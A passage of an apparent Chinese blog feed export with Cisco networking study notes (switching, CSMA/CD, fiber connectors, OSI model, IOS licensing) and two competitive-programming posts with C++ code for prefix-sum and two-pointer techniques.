交换机的MAC地址表的老化时间是300秒</p><p>交换机如果发现一个帧的入端口和MAC地址表中源MAC地址的所在端口不同，交换机将MAC地址重新学习到新的端口。</p><p>&nbsp;</p><h3 id="单工半双工全双工">单工、半双工、全双工</h3><ul><li>单工:只有一个信道，传输方向只能是单向的。（寻呼机）</li><li>半双工：只有一个信道，在同一时刻，只能是单向传输。（对讲机）</li><li>全双工：双信道，同时可以有双向数据传输。（打电话）</li></ul><h2 id="冲突域和广播域">冲突域和广播域</h2><h3 id="冲突域">冲突域</h3><p>所谓冲突域是由共用传输通道导致的，如下图一，一台设备，只有一个传输通道，同一时刻该设备下的所有主机通信都需要通过“竞争”来获得传输信道的使用权，而其他设备只能等待，否则会发生冲突。</p><p>集线器（所有设备在同一个冲突域、同一个广播域。可以将集线器设备理解为单车道，同一时间只能通行一辆车。），交换机（每个接口是一个冲突域、一个广播域。可以将交换机理解为多车道）</p><h3 id="广播域">广播域</h3><p>广播域就是说，如果站点发出一个广播信号后能接收到这个信号的范围，通常来说一个局域网就是一个广播域。（用路由器连接的除外）。冲突域是一个站点向另一个站点发出信号，除目的站点外，有多少站点能收到这个信号，这些站点就构成一个冲突域。</p><p>广播域可以跨网段，而冲突域只是发生的同一个网段的。</p><h2 id="总结">总结</h2><ol type="1"><li>交换机根据收到数据帧中的源MAC地址建立该地址同交换机端口的映射，并将其写入MAC地址表中。</li><li>交换机将数据帧中的目的MAC地址同已建立的MAC地址表进行比较，以决定由哪个端口进行转发。</li><li>如数据帧中的目的MAC地址不在MAC地址表中，则向所有端口转发（除源端口）ARP请求。这一过程称为泛洪（flood）。</li><li>交换机在接收到数据帧以后，首先、会记录数据帧中的源MAC地址和对应的接口到MAC表中，接着、会检查自己的MAC表中是否有数据帧中目标MAC地址的信息，如果有则会根据MAC表中记录的对应接口将数据帧发送出去(也就是单播)，如果没有，则会将该数据帧从非接受接口发送出去(也就是广播)。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 思科人才孵化项目笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n数选数和为倍数</title>
      <link href="/2022/03/31/n-shu-xuan-shu-he-wei-bei-shu/"/>
      <url>/2022/03/31/n-shu-xuan-shu-he-wei-bei-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="从n个数中选出几个数使和为n的倍数鸽巢原理">从n个数中选出几个数使和为n的倍数(鸽巢原理)</h1><h2 id="origin">Origin</h2><p><a href="http://oj.daimayuan.top/problem/456">Daimayuan Online Judge- 456</a></p><h3 id="题意">题意：</h3><p>给定一个长度为 <span class="math inline">\(n(n \le {10^5})\)</span>的数组，你需要从里面选择一些数，使得其和为 <span class="math inline">\(n\)</span> 的倍数。</p><h3 id="思路">思路：</h3><p>我们可以计算前缀和，其中 <span class="math inline">\(pre[0] =0,pre[1] = a[1],pre[2] = a[1] + a[2]\)</span>。</p><p>对于前缀和数组来说，一共有 <span class="math inline">\(n+1\)</span>个数，而我们关心的是 <span class="math inline">\(n\)</span>的倍数，所以我们都模上 <span class="math inline">\(n\)</span> 。</p><p>而模 <span class="math inline">\(n\)</span> 的值的可能只有 <span class="math inline">\([0,n - 1]\)</span> 种，那么这 <span class="math inline">\(n+1\)</span> 个数中一个存在两个相同的数。</p><ul><li><p>如果后 <span class="math inline">\(n\)</span> 个数里面有 <span class="math inline">\(0\)</span> 的话，可以和 <span class="math inline">\(pre[0]\)</span> 匹配。</p></li><li><p>如果后 <span class="math inline">\(n\)</span> 个数里面没有 <span class="math inline">\(0\)</span> 的话，那就是 <span class="math inline">\(n\)</span> 个位置里面塞 <span class="math inline">\(n-1\)</span> 种数，必然有一个重复的。</p></li></ul><p>可以发现，我们一定能找到一种情况。</p><h2 id="code">Code</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">,</span> pre<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">slove</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> pre<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%=</span> n<span class="token punctuation">;</span>map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&gt;</span>mp<span class="token punctuation">;</span> mp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%=</span> n<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>mp<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">-</span> mp<span class="token punctuation">[</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> mp<span class="token punctuation">[</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> j <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span>mp<span class="token punctuation">[</span>pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科人才孵化项目 Day3</title>
      <link href="/2022/03/29/si-ke-fu-hua-xiang-mu-day3/"/>
      <url>/2022/03/29/si-ke-fu-hua-xiang-mu-day3/</url>
      
        <content type="html"><![CDATA[<h1 id="思科孵化项目-day3">思科孵化项目 Day3</h1><h2 id="mac">MAC</h2><p>MAC主要负责控制与连接物理层的物理介质。在发送数据的时候，MAC协议可以事先判断是否可以发送数据，如果可以发送将给数据加上一些控制信息，最终将数据以及控制信息以规定的格式发送到物理层；在接收数据的时候，MAC协议首先判断输入的信息并是否发生传输错误，如果没有错误，则去掉控制信息发送至LLC（逻辑链路控制）层。</p><p>MAC地址——介质访问控制层地址所有电子产品的芯片都有一个全球唯一的号码（网卡）</p><p>电脑中的网络适配器就是网卡，打开电脑至少可以看到两个网卡。以太网是插网线的，WLAN是连wifi的。</p><p>其实这些网卡只有一个是真实存在的，以太网的网卡。若连接网线它点进去，找到网络连接详细信息，可以看到一个48位二进制以十六进制显示的物理地址，这就是它全球唯一的号码。</p><h2 id="集线器hub">集线器（Hub）</h2><p>集线器的主要功能是对接收到的信号进行再生整形放大，以扩大网络的传输距离，同时把所有节点集中在以它为中心的节点上。它工作于OSI(开放系统互联参考模型)参考模型第一层，即“物理层”。</p><p>集线器传输数据时，不能多个用户同时发送数据。这时就有了CSMA/CD协议</p><h3 id="csmacd-载波侦听多路访问冲突检测">CSMA/CD载波侦听多路访问/冲突检测</h3><p>在交换机未出现前，使用的都是集线器（hub）,在mac层很多数据在传输，为了确保数据传输不混乱，出现了CSMA/CD。</p><p>CSMA/CD（Carrier Sense Multiple Access with CollisionDetection，载波侦听多路访问/冲突检测协议），早期主要是以太网络中数据传输方式，广泛应用于以太网中。</p><p>载波侦听（CarrierSense），意思是网络上各个工作站在发送数据前，都要确认总线上有没有数据传输。若有数据传输（称总线为忙），则不发送数据；若无数据传输（称总线为空），立即发送准备好的数据。</p><p>多路访问（MultipleAccess），意思是网络上所有工作站收发数据，共同使用同一条总线，且发送数据是广播式。</p><p>“冲突检测”是指发送结点在发出信息帧的同时，还必须监听媒体，判断是否发生冲突（同一时刻，有无其他结点也在发送信息帧）。</p><p>CSMA/CD的标准为IEEE802.3或者ISO8802/3</p><p>这样的话网络效率很低，虽然一定程度上解决了冲突，但是增加了网络延时。</p><p>这时网络如果需要继续变大，想要所有人同时发送和接收自己的数据。所有人同时出去不撞。</p><h2 id="交换机网桥的进阶版拥有大量接口的网桥二层设备">交换机（网桥的进阶版，拥有大量接口的网桥，二层设备）</h2><p>交换机（Switch）意为“开关”是一种用于电（光）信号转发的网络设备。它可以为接入交换机的任意两个网络节点提供独享的电信号通路。</p><p>所以呢这个交换机</p><p>1、需要无限的传输距离</p><p>2、还要没有冲突——所有节点可以同时发送和接收自己的数据</p><p>3、单播——一对一传输数据</p><p>4、应用在二层数据链路层的介质访问控制层，不是纯物理设备。</p><p>5、把二进制变成电信号或者把电信号变成二进制解决了无限的传输距离。</p><p>在交换机没有发明出来前使用的是集线器，集线器是纯物理设备工作在第一层。</p><p>集线器只是把接收到的数据信号进行放大以达到增加传输距离的目的。</p><p>而交换机有了学习的能力，可以把接收到的电信号重新写为二进制，再把二进制重新变成电信号传出去。这样数据没有遗失也不会损坏。这就实现了数据无限传输距离。理论上可以。</p><p>在数据从电流变为二进制数据进入交换机后，交换机把这些数据存入它自己的内存中。这时就不会有冲突发生，因为此时交换机里的是二进制数据，没有电流，它们不会相互影响。这就解决了冲突问题。</p><h3 id="单播">单播</h3><p>在数据通过应用层和表示层后转换为二进制进入物理层传输出去，这个过程中会给这个二进制数据报头前加一个源MAC地址和目的MAC地址。进入交换机后，交换机就看这个源目的MAC从哪来，目的MAC到哪去。进行一对一传输。</p><h3 id="交换机工作原理">交换机工作原理：</h3><p>当数据帧进入交换机后，交换机先查看数据中的源MAC地址，之后将该数据进入的接口与该MAC映射记录到本地的MAC表中；</p><p>再查看数据帧中的目标MAC地址，基于目标MAC地址查看本地MAC表；</p><p>若表中存在记录将仅从该记录的接口转发数据；——单播</p><p>2.若没有MAC地址对应的接口记录，将洪泛（除流量的进入接口外，其他的所有接口复制转出）该数据。</p><p>泛洪/洪泛</p><p>洪泛范围越大，网络越卡。因为所有接口都在接收数据，网络中会有大量垃圾信息。</p><p>然后，有人觉得交换机洪泛后，网络太卡了，就发明了路由器。</p><h2 id="光纤">光纤</h2><p>ST、SC、FC光纤接头是早期不同企业开发形成的标准，使用效果一样，各有优缺点。</p><p>ST、SC连接器接头常用于一般网络。ST头插入后旋转半周有一卡口固定，缺点是容易折断；SC连接头直接插拔，使用很方便，缺点是容易掉出来；FC连接头一般电信网络采用，有一螺帽拧到适配器上，优点是牢靠、防灰尘，缺点是安装时间稍长。</p><p>MTRJ型光纤跳线由两个高精度塑胶成型的连接器和光缆组成。连接器外部件为精密塑胶件，包含推拉式插拔卡紧机构。适用于在电信和数据网络系统中的室内应用。</p><h3 id="光纤接口连接器的种类">光纤接口连接器的种类</h3><p>LC/PC 光纤接头</p><p>光纤连接器，也就是接入光模块的光纤接头，也有好多种，且相互之间不可以互用。不是经常接触光纤的人可能会误以为GBIC和SFP模块的光纤连接器是同一种，其实不是的。SFP模块接LC光纤连接器，而GBIC接的是SC光纤光纤连接器。下面对网络工程中几种常用的光纤连接器进行详细的说明：</p><ol type="1"><li>FC型光纤连接器：外部加强方式是采用金属套，紧固方式为螺丝扣。一般在ODF侧采用(配线架上用的最多）</li><li>SC型光纤连接器：连接GBIC光模块的连接器，它的外壳呈矩形，紧固方式是采用插拔销闩式，不须旋转。(路由器交换机上用的最多)</li><li>ST型光纤连接器：常用于光纤配线架，外壳呈圆形，紧固方式为螺丝扣。（对于10Base-F连接来说，连接器通常是ST类型。常用于光纤配线架）</li><li>LC型光纤连接器：连接SFP模块的连接器，它采用操作方便的模块化插孔(RJ)闩锁机理制成。（路由器常用）</li><li>MT-RJ：收发一体的方形光纤连接器，一头双纤收发一体</li></ol>]]></content>
      
      
      <categories>
          
          <category> 思科人才孵化项目笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CiscoIOS的不同License说明</title>
      <link href="/2022/03/29/ciscoios-de-bu-tong-license-shuo-ming/"/>
      <url>/2022/03/29/ciscoios-de-bu-tong-license-shuo-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscoios的不同license说明">CiscoIOS的不同License说明</h1><p>Cisco IOS的License在v15.0时进行过大幅度的修改，<br>因此两种License的说明会以12.4前和15.0后说明。</p><h2 id="前">12.4 前</h2><p>以前的时代所使用的License版本繁多<br>要切换到不同功能的方法是 "安装新的IOS"，而不是安装License档案</p><h2 id="后">12.4 后</h2><p>全部IOS都支持SSH<br>这个时期的License是所谓的 "荣誉License"<br>有点像无人商店，先付钱买进阶的功能，然后再变更ios，当然也可以想办法找到ios然后自己变更</p><ul><li>IP Base - 最基本的操作系统 IP Voice - 多了VoIP功能 AdvSecurity -提升安全性相关的功能 SPServices - 服务提供商常用的功能 Enterprise Base -想要跑完整的路由协定吗，需要买这个 AdvIPServices - 包含AdvancedSecurity和 SP Services的功能 EntServices - 包含Enterprise Base和 SPServices的功能 AdvEntServices - 包含全部的功能</li></ul><p>15.0以后，License的变化变少了</p><p>要使用新的功能要先安装License档案，然后重开机就可以，不用变更IOS映像，但一定要花钱买License才能使用这些功能</p><ul><li>IP Base - 最基本的License，买硬体就有，终于可以用完整的路由了</li><li>Security - 让Router变得像防火墙!! 其中SSLVPN、IPS和ContentFiltering这三个功能要额外买</li><li>UC - 如果要把Router当作IPPBX的话要买这个，但电话太多还是买License</li><li>Data - 一些大型机房比较会用到的功能，MPLS、GLBP、IP SLA (!!)</li></ul><p>如果要全部功能都有，那就要买三个License，通通装进去，这样就有全部功能官方建议的12.4转换到15.0的License购买表格，或者可以用Cisco SoftwareSelector</p><p>12.4的功能: （建议购买的15版License）</p><p>IPBase IPBase</p><p>IP Voice UC</p><p>Enterprise Base DATA</p><p>Enterprise Services DATA + UC</p><p>SP Services DATA + UC (主要看有没有用到这些功能)</p><p>Advanced Security SEC</p><p>Advanced IP Services SEC + UC + DATA (主要看有没有用到这些功能)</p><p>Advanced Enterprise Services SEC + UC + DATA</p><h2 id="固件的命名规则">固件的命名规则</h2><p>12.4以前，ios所拥有的功能会写在文件名称上15以后都用universal表示，因为已经内含这些功能了，就等你花钱买</p><p>例如：</p><p><code>c2811nm-advipservicesk9-mz.124-6.T.bin</code></p><p><code>c1900-universalk9-mz.151-4.M5.bin</code></p><p><code>platform</code>-<code>features</code>-<code>type</code>.<code>release version</code></p><ul><li><p><strong>platform</strong> - 可以在那些机型内运作</p></li><li><p><strong>features</strong> -拥有哪些功能，如IPbase或AdvIPservices</p></li><li><p><strong>type</strong> - ios的执行地点和映像档的压缩格式</p></li><li><p><strong>release version</strong> - 版本号</p></li><li><p>k9 - 内建较强的加密技术，3DES/AES的加密功能</p></li><li><p>k8 - 内建较弱的加密技术 (DES)，如果手上有 k8 的设备，可以免费下载k9的License</p></li></ul><p>TYPE内的第一个英文字：ios的执行地点</p><ul><li><strong>f</strong> - flash，可以在flash内执行IOS</li><li><strong>m</strong> - RAM，可以在记忆体内执行IOS (最常见)</li><li><strong>r</strong> - ROM，在ROM里面执行IOS</li><li><strong>l</strong> - 映像档可以再重新分配</li></ul><p>TYPE内的第二个英文字 - 压缩格式 z - 使用zip压缩 (最常见) x -使用mzip压缩</p><h2 id="其它的license">其它的License</h2><p>2960交换机：现在买到的应该是2960-X系列，分成3个版本 LAN Lite -阳春版，没有RPS、PoE、DHCP snooping等进阶安全功能 LAN Base -一般购买的交换器都是这个版本，LLDP、MLD和进阶安全功能ARP inspect等 IPLite - 可以用静态路由，只限2960-X以后才有不同版本间不能升级或降级，因为硬体本身就不支援网路上已经有整理好的表格，或者可以上Cisco FeatureNavigator查看需要的版本</p><p>6500和4500系列的交换器 IPBase的功能没有完整的路由功能，要买到IPService才有</p><p>其它还有Nexus系列的产品和安全的ASA系列(SourceFire)，还有无线等，一堆License</p><p>Useful Toolkits:</p><ul><li><a href="http://www.cisco.com/go/fn">Cisco FeatureNavigator</a></li><li><a href="https://tools.cisco.com/security/center/selectIOSVersion.x">CiscoSoftware Selector</a></li><li><a href="https://www.cisco.com/cgi-bin/Support/Bugtool/launch_bugtool.pl">CiscoIOS Software Bug Toolkit</a></li></ul><p><strong>注意 :</strong> <code>universalk9</code> 和<code>universalk9-npe</code> 的差别</p><p><strong>npe</strong>描述很重要</p><p>npe代表的是不含payload加密的功能，如IPsec就是会把payload加密的功能，npe不能使用IPsec等其它类似的功能。</p><p>npe主要是贩卖给某些国家，这些国家禁止使用强效的加密能力</p><p>另外，一旦把Cisco给的LicenseKey上网注册到某一台路由器后，License就不能再转移到其它路由器上</p><p>除非设备故障，维修后送一台新的，这个时候会拿到一个RMA Number，把RMA、License KEY、新旧设备的序号准备完好才能做License的转移</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> License </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尺取法</title>
      <link href="/2022/03/26/chi-qu-fa/"/>
      <url>/2022/03/26/chi-qu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="尺取法">尺取法</h1><p>尺取法是一个降低复杂度的优化算法。</p><h2 id="例题">例题</h2><p>题目：给定一个数组和一个数s，在这个数组中找一个区间，使得这个区间之和等于s。</p><p>例如：给定的数组int x[14] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,13, 14};和一个s = 15。那么，可以找到的区间就应该有0到4， 3到5，6到7.（注意这里的下标从0开始）</p><p>对于这样的题，不用任何技巧就可以跑出结果，例如下面这个方法可能是大多数人能够想出来的：</p><p>先用一个数组sum[i]存放前i个元素的和，其实现用的是”递推思想“，注意，在编程中”递推“的思想用的特别多，一定要习惯这种思维方式。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">sum<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//x为给定的原数组</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> sum<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//递推思想</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过两层循环求解</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span>sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d---%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的方法当然是可行的，但是复杂度太高，有一个算法可以将其复杂度降为O(n)。这就是尺取算法。</p><p>尺取法：顾名思义，像尺子一样取一段，借用挑战书上面的话说，尺取法通常是对数组保存一对下标，即所选取的区间的左右端点，然后根据实际情况不断地推进区间左右端点以得出答案。之所以需要掌握这个技巧，是因为尺取法比直接暴力枚举区间效率高很多，尤其是数据量大的。</p><p>那么，用”尺取法“做上面这道题思路应该是这样的：</p><p>其实，这种方法很类似于蚯蚓的蠕动。</p><p>1）用一对脚标i, j。最开始都指向第一个元素。</p><p>2）如果区间i到j之和比s小，就让j往后挪一位，并把sum的值加上这个新元素。相当于蚯蚓的头向前伸了一下。</p><p>3）如果区间i到j之和比s大，就让sum减掉第一个元素。相当于蚯蚓的尾巴向前缩了一下。</p><p>4）如果i到j之和刚好等于s，则输入。</p><h3 id="full-code">Full Code</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdio&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">findSUM</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>A<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> sum <span class="token operator">=</span> A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>sum <span class="token operator">&gt;=</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>sum <span class="token operator">==</span> s<span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d---%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>sum <span class="token operator">-=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>j<span class="token operator">++</span><span class="token punctuation">;</span>sum <span class="token operator">+=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>std<span class="token double-colon punctuation">::</span>ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> m<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> m<span class="token punctuation">;</span>    <span class="token function">findSUM</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尺取法一般只有O（n）的复杂度，针对大规模数据还是很有效的。另外，”尺取法“有时候也叫双指针法。</p>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 尺取法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科人才孵化项目 Day2</title>
      <link href="/2022/03/24/si-ke-fu-hua-xiang-mu-day2/"/>
      <url>/2022/03/24/si-ke-fu-hua-xiang-mu-day2/</url>
      
        <content type="html"><![CDATA[<h1 id="思科孵化项目-day2">思科孵化项目-Day2</h1><h2 id="端到端通信模型host-to-host-communications-overview">端到端通信模型（Host-To-HostCommunications Overview）</h2><h3 id="元素">元素</h3><ul><li>源（Source）</li><li>传输媒介（Transmission Media）</li><li>目标（Destination）</li></ul><p><code>Source &lt;-Transmission Media-&gt; Cloud &lt;-Transmission Media-&gt; Destination</code></p><h2 id="网络中实际应用分类">网络中实际应用分类：</h2><ul><li>成块数据流：FTP、TFTP、库存更新</li><li>无需直接人工交互</li><li>带宽很重要，但并非关键性因素</li><li>交互式数据流：库存查询，数据库更新</li><li>人机交互</li><li>响应时间</li><li>事实应用数据流：VoIP 视频</li><li>人与人的交互</li><li>端到端的延时至关重要</li></ul><h2 id="分层优点">分层优点：</h2><ol type="1"><li>促进标准化工作，允许各供应商独立开发</li><li>各层间独立，把网络操作分成低复杂想单元</li><li>灵活性好，某一层变化不会影响其他层</li><li>各层通过一个接口在相邻层上下通信</li></ol><h2 id="osi模型">OSI模型</h2><h3 id="定义">定义</h3><p>OSI模型，即开放式通信系统互联参考模型（Open System InterconnectionReferenceModel），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。</p><p><strong>OSI七层模型</strong></p><p>OSI定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）</p><h4 id="应用层">应用层：</h4><p>为应用程序或用户请求提供各种请求服务。OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p><h4 id="表示层">表示层：</h4><p>数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><h4 